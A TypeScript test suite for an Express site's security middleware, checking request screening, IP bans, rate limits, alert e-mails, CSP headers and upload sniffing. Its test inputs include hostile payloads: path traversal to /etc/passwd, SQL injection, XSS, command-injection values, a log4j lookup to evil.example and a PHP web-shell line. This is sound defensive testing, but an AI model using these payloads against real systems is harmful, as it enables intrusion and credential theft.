import type { NextFunction, Request, Response } from "express";
import { describe, expect, it, vi } from "vitest";
import { sniffAudio } from "./chat-voice";
import { AlertSender, SecurityMonitor, buildCsp, buildSecurityReport, clientInfo, inlineScriptHashes, inspectRequest } from "./security";

const UA = "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0) AppleWebKit/605.1.15 Safari/604.1";

describe("request screening", () => {
	const attacks: [string, string][] = [
		["/../../etc/passwd", "path-traversal"],
		["/en/%2e%2e/%2e%2e/etc/passwd", "path-traversal"],
		["/..%2f..%2fwindows/win.ini", "path-traversal"],
		["/.env", "sensitive-file"],
		["/.git/config", "sensitive-file"],
		["/backup.sql.gz", "sensitive-file"],
		["/wp-login.php", "cms-probe"],
		["/phpmyadmin/index.php", "cms-probe"],
		["/en/search?q=1' OR 1=1--", "sql-injection"],
		["/en?id=1 UNION SELECT username,password FROM users", "sql-injection"],
		["/en?x=<script>alert(1)</script>", "xss"],
		["/en?x=%3Cscript%3Ealert(1)%3C/script%3E", "xss"],
		["/en?x=javascript:alert(1)", "xss"],
		["/en?c=;cat /etc/passwd", "path-traversal"],
		["/en?c=|whoami", "command-injection"],
		["/en?x=${jndi:ldap://evil.example/a}", "template-or-log4j"],
		["/en?x=%00", "null-byte"],
		["/" + "a".repeat(2100), "oversized-url"],
	];
	for (const [url, kind] of attacks) {
		it(`flags ${kind}: ${url.slice(0, 50)}`, () => {
			
			expect(inspectRequest("GET", url, UA)).not.toBeNull();
		});
	}

	it("rejects unusual HTTP methods and scanner user agents", () => {
		expect(inspectRequest("TRACE", "/", UA)).toBe("method-trace");
		expect(inspectRequest("DELETE", "/api/x", UA)).toBe("method-delete");
		expect(inspectRequest("GET", "/en", "sqlmap/1.7")).toBe("scanner-user-agent");
		expect(inspectRequest("GET", "/en", "Nikto/2.1.6")).toBe("scanner-user-agent");
	});

	it("never flags normal browsing", () => {
		const ok = ["/", "/en", "/ar/services", "/zh-CN/portfolio", "/hi/industries/luxury-brands", "/en/contact?utm_source=instagram&utm_campaign=eid", "/airo-assets/images/pages/home/hero-fallback", "/airo-assets/uploads/mdm-home-portfolio-1.jpg", "/assets/index-DxenW0hi.js", "/robots.txt", "/sitemap.xml", "/api/health", "/api/chat/voice/123e4567-e89b-12d3-a456-426614174000.webm", "/en/services#social"];
		for (const u of ok) expect(inspectRequest(u === "/api/health" ? "GET" : "GET", u, UA), u).toBeNull();
		expect(inspectRequest("POST", "/api/contact/contact-us", UA)).toBeNull();
		expect(inspectRequest("GET", "/en/about", "Googlebot/2.1 (+http://www.google.com/bot.html)")).toBeNull();
	});
});

function fakeReq(over: Record<string, unknown> = {}): Request {
	return { method: "GET", path: "/en", url: "/en", originalUrl: "/en", headers: { "user-agent": UA, "x-forwarded-for": "8.8.4.4" }, socket: { remoteAddress: "10.0.0.2" }, ...over } as unknown as Request;
}
function run(mon: SecurityMonitor, req: Request) {
	const out = { status: 0, body: "" as unknown, passed: false };
	const res = {
		status(c: number) {
			out.status = c;
			return this;
		},
		type() {
			return this;
		},
		set() {
			return this;
		},
		send(b: unknown) {
			out.body = b;
			return this;
		},
		json(b: unknown) {
			out.body = b;
			return this;
		},
	} as unknown as Response;
	mon.guard()(req, res, (() => (out.passed = true)) as NextFunction);
	return out;
}

describe("guard", () => {
	it("answers attacks with an uninformative 404, records them, then bans a repeat offender", () => {
		const mon = new SecurityMonitor();
		const bad = (p: string) => fakeReq({ path: p, url: p, originalUrl: p });
		expect(run(mon, bad("/.env")).status).toBe(404);
		expect(run(mon, bad("/wp-login.php")).status).toBe(404);
		expect(run(mon, bad("/../../etc/passwd")).status).toBe(404);
		expect(mon.isBanned("8.8.4.4")).toBe(true);
		const after = run(mon, fakeReq());
		expect(after.status).toBe(403);
		expect(after.passed).toBe(false);
		expect(run(mon, fakeReq({ headers: { "user-agent": UA, "x-forwarded-for": "1.2.3.4" } })).passed).toBe(true); // others unaffected
	});

	it("never limits or bans loopback / unidentifiable proxy addresses (so real visitors can't be locked out)", () => {
		const mon = new SecurityMonitor({ pageLimitPerMin: 2 });
		const local = fakeReq({ headers: { "user-agent": UA }, socket: { remoteAddress: "127.0.0.1" } });
		for (let i = 0; i < 20; i++) expect(run(mon, local).passed).toBe(true);
		const bad = fakeReq({ path: "/.env", url: "/.env", originalUrl: "/.env", headers: { "user-agent": UA }, socket: { remoteAddress: "127.0.0.1" } });
		for (let i = 0; i < 5; i++) run(mon, bad);
		expect(mon.isBanned("127.0.0.1")).toBe(false);
	});

	it("rate-limits floods with 429 and Retry-After", () => {
		const mon = new SecurityMonitor({ pageLimitPerMin: 5, apiLimitPerMin: 3 });
		const results = Array.from({ length: 8 }, () => run(mon, fakeReq()).status);
		expect(results.slice(5)).toEqual([429, 429, 429]);
		const api = Array.from({ length: 5 }, () => run(mon, fakeReq({ path: "/api/chat/event", url: "/api/chat/event", originalUrl: "/api/chat/event", method: "POST", headers: { "user-agent": UA, "x-forwarded-for": "9.9.9.9" } })).status);
		expect(api.slice(3)).toEqual([429, 429]);
	});

	it("caps total contact-form submissions per hour (inbox flooding by many addresses)", () => {
		const mon = new SecurityMonitor({ contactPerHour: 3 });
		const post = (n: number) => run(mon, fakeReq({ method: "POST", path: "/api/contact/contact-us", url: "/api/contact/contact-us", originalUrl: "/api/contact/contact-us", headers: { "user-agent": UA, "x-forwarded-for": `20.0.0.${n}` } })).status;
		expect([1, 2, 3, 4].map(post)).toEqual([0, 0, 0, 429]);
	});

	it("takes the client address from the proxy header", () => {
		expect(clientInfo(fakeReq({ headers: { "cf-connecting-ip": "5.5.5.5", "x-forwarded-for": "1.1.1.1" } })).ip).toBe("5.5.5.5");
		expect(clientInfo(fakeReq({ headers: { "x-forwarded-for": "7.7.7.7, 10.0.0.1" } })).ip).toBe("7.7.7.7");
	});
});

describe("alert e-mail", () => {
	function monitorWithAttacker() {
		const mon = new SecurityMonitor();
		for (const p of ["/.env", "/wp-login.php", "/../../etc/passwd"]) run(mon, fakeReq({ path: p, url: p, originalUrl: p, headers: { "user-agent": "sqlmap/1.7", "x-forwarded-for": "203.0.113.9" } }));
		return mon;
	}

	it("contains the attacker's IP, what was tried and the action taken", () => {
		const mon = monitorWithAttacker();
		const { title, body } = buildSecurityReport(mon.takePending(), new Date("2026-10-04T19:30:00Z"));
		expect(title).toMatch(/SECURITY ALERT — \d+ suspicious requests from 1 IPs \(1 blocked\)/);
		expect(body).toContain("203.0.113.9");
		expect(body).toContain("scanner-user-agent");
		expect(body).toContain("BLOCKED 60 min");
		expect(body).toContain("sqlmap");
		expect(body).toMatch(/23:30 UAE time|2026-10-04 23:30/);
	});

	it("sends a digest, throttles repeat mails and keeps the alert queued if sending fails", async () => {
		const mon = monitorWithAttacker();
		let t = 1_000_000;
		const send = vi.fn().mockRejectedValueOnce(new Error("offline")).mockResolvedValue(undefined);
		const alerts = new AlertSender(mon, send, 10 * 60_000, 6, () => t);
		expect(await alerts.tick()).toBe(false); // failed → still pending
		expect(mon.hasPending()).toBe(true);
		expect(await alerts.tick()).toBe(true);
		expect(send).toHaveBeenCalledTimes(2);
		run(mon, fakeReq({ path: "/.env", url: "/.env", originalUrl: "/.env", headers: { "user-agent": UA, "x-forwarded-for": "198.51.100.4" } }));
		t += 60_000;
		expect(await alerts.tick()).toBe(false); // within the 10-minute gap
		t += 10 * 60_000;
		expect(await alerts.tick()).toBe(true);
	});
});

describe("headers and uploads", () => {
	it("builds a strict content-security-policy with hashed inline scripts and no unsafe-inline scripts", () => {
		const html = `<script>(function(){var a=1})()</script><script src="/x.js"></script><script type="application/ld+json">{"a":1}</script>`;
		const hashes = inlineScriptHashes(html);
		expect(hashes).toHaveLength(1);
		const csp = buildCsp(hashes, false, true);
		expect(csp).toMatch(/script-src 'self' 'sha256-[A-Za-z0-9+/=]+'/);
		expect(csp.split(";").find((d) => d.trim().startsWith("script-src"))).not.toContain("'unsafe-inline'");
		expect(csp).toContain("object-src 'none'");
		expect(csp).toContain("base-uri 'self'");
		expect(csp).toContain("frame-ancestors");
		expect(csp).toContain("upgrade-insecure-requests");
	});

	it("identifies real audio by its first bytes and rejects everything else", () => {
		expect(sniffAudio(Buffer.from([0x1a, 0x45, 0xdf, 0xa3, 0, 0, 0, 0, 0, 0, 0, 0]))).toBe("webm");
		expect(sniffAudio(Buffer.from("OggS\0\0\0\0\0\0\0\0"))).toBe("ogg");
		expect(sniffAudio(Buffer.from("\0\0\0\x20ftypM4A "))).toBe("m4a");
		expect(sniffAudio(Buffer.from("RIFF\0\0\0\0WAVE"))).toBe("wav");
		expect(sniffAudio(Buffer.from("<script>alert(1)</script>"))).toBeNull();
		expect(sniffAudio(Buffer.from("MZ\x90\0\x03\0\0\0\x04\0\0\0\xff\xff"))).toBeNull(); // Windows executable
		expect(sniffAudio(Buffer.from("<?php system($_GET['c']); ?>"))).toBeNull();
	});
});

describe("nothing can be published, uploaded or changed by the public", () => {
	const post = (path: string, headers: Record<string, string> = {}) =>
		fakeReq({ method: "POST", path, url: path, originalUrl: path, headers: { "user-agent": UA, "x-forwarded-for": "44.0.0.1", ...headers } });

	it("refuses file uploads anywhere (multipart) and records the attempt", () => {
		const mon = new SecurityMonitor();
		const r = run(mon, post("/api/chat/voice", { "content-type": "multipart/form-data; boundary=x" }));
		expect(r.status).toBe(415);
		expect(mon.takePending()[0]!.reasons).toHaveProperty("upload-attempt");
	});

	it("refuses writes to any endpoint that isn't one of the three public ones", () => {
		for (const p of ["/api/upload", "/api/posts", "/api/admin/login", "/api/contact", "/api/contact/a/b", "/", "/en/about", "/api/chat/stats", "/airo-assets/uploads/x.png"]) {
			const mon = new SecurityMonitor();
			const r = run(mon, post(p));
			expect(r.status, p).toBe(404);
			expect(r.passed, p).toBe(false);
			expect(mon.takePending()[0]!.reasons, p).toHaveProperty("write-attempt");
		}
	});

	it("still lets the legitimate forms and chat through", () => {
		const mon = new SecurityMonitor();
		for (const p of ["/api/contact/contact-us", "/api/chat/event", "/api/chat/voice"]) expect(run(mon, post(p)).passed, p).toBe(true);
	});

	it("rejects PUT / PATCH / DELETE outright", () => {
		for (const method of ["PUT", "PATCH", "DELETE"]) expect(run(new SecurityMonitor(), fakeReq({ method })).status).toBe(405);
	});
});
